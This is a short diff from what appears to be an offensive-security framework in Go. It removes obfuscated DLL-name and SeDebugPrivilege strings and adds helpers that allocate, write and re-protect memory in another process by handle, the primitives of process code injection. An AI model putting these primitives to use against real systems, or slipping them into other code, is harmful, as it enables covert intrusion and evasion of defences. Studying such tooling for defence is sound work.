@@ -1,4 +1,4 @@
-//go:build windows && crypt
+//go:build windows && !map
 
 // Copyright (C) 2020 - 2022 iDigitalFlame
 //
@@ -16,19 +16,26 @@
 // along with this program.  If not, see <https://www.gnu.org/licenses/>.
 //
 
-package winapi
+package cmd
 
-import "github.com/iDigitalFlame/xmt/util/crypt"
+import "github.com/iDigitalFlame/xmt/device/winapi"
 
-var (
-	dllExt    = crypt.Get(2)[1:] // *.dll
-	debugPriv = crypt.Get(96)    // SeDebugPrivilege
-
-	dllKernel32 = &lazyDLL{name: crypt.Get(97)}  // kernel32.dll
-	dllNtdll    = &lazyDLL{name: crypt.Get(98)}  // ntdll.dll
-	dllGdi32    = &lazyDLL{name: crypt.Get(99)}  // gdi32.dll
-	dllUser32   = &lazyDLL{name: crypt.Get(100)} // user32.dll
-	dllWinhttp  = &lazyDLL{name: crypt.Get(101)} // winhttp.dll
-	dllDbgHelp  = &lazyDLL{name: crypt.Get(102)} // DbgHelp.dll
-	dllAdvapi32 = &lazyDLL{name: crypt.Get(103)} // advapi32.dll
-)
+func freeMemory(h, addr uintptr) error {
+	return winapi.NtFreeVirtualMemory(h, addr)
+}
+func writeMemory(h uintptr, protect uint32, n uint64, b []byte) (uintptr, error) {
+	// 0x4 - PAGE_READWRITE
+	a, err := winapi.NtAllocateVirtualMemory(h, uint32(n), 0x4)
+	if err != nil {
+		return 0, err
+	}
+	if _, err := winapi.NtWriteVirtualMemory(h, a, b); err != nil {
+		winapi.NtFreeVirtualMemory(h, a)
+		return 0, err
+	}
+	if _, err := winapi.NtProtectVirtualMemory(h, a, uint32(n), protect); err != nil {
+		winapi.NtFreeVirtualMemory(h, a)
+		return 0, err
+	}
+	return a, nil
+}
